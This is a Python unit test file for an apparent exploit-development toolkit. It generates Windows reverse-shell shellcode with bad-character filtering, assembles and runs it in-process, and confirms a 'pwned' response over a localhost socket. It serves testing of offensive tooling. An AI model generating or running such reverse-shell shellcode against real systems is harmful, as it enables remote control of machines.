import random
import socket
import time
import unittest

import stones
from coder import reverse_shell
from runner import load_shellcode, run_shellcode


def test_reverse_shell_shellcode(shellcode, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("0.0.0.0", port))
        s.listen()

        ptr = load_shellcode(shellcode)
        run_shellcode(ptr, wait=False)

        client_s, _ = s.accept()

    client_s.send(b"echo p^w^n^e^d\r\n")
    time.sleep(0.5)

    resp = client_s.recv(0x1000)
    client_s.send(b"exit\r\n")
    client_s.close()

    return b"pwned" in resp


class TestReverseShell(unittest.TestCase):
    def test_run_shellcode(self):
        port = random.randint(49152, 65535)
        bad_chars = b"\x00"

        code = reverse_shell.generate(
            "127.0.0.1",
            port,
            bad_chars=bad_chars,
            exit_func=("ntdll.dll", "RtlExitUserThread"),
            debug=False,
        )
        shellcode = stones.assemble(code)
        self.assertFalse(any(c in bad_chars for c in shellcode))

        self.assertTrue(test_reverse_shell_shellcode(shellcode, port))

    def test_run_replaced_shellcode(self):
        port = random.randint(49152, 65535)
        bad_chars = b"\x00\x08\x09\x0A\x0B\x0D\x20\x23\x25\x26\x2E\x2F\x3D\x3F\x5C"

        code = reverse_shell.generate(
            "127.0.0.1",
            port,
            bad_chars=bad_chars,
            exit_func=("ntdll.dll", "RtlExitUserThread"),
            debug=False,
        )
        replaced_code = stones.replace_instructions(code, bad_chars)
        shellcode = stones.assemble(replaced_code)
        self.assertFalse(any(c in bad_chars for c in shellcode))

        self.assertTrue(test_reverse_shell_shellcode(shellcode, port))
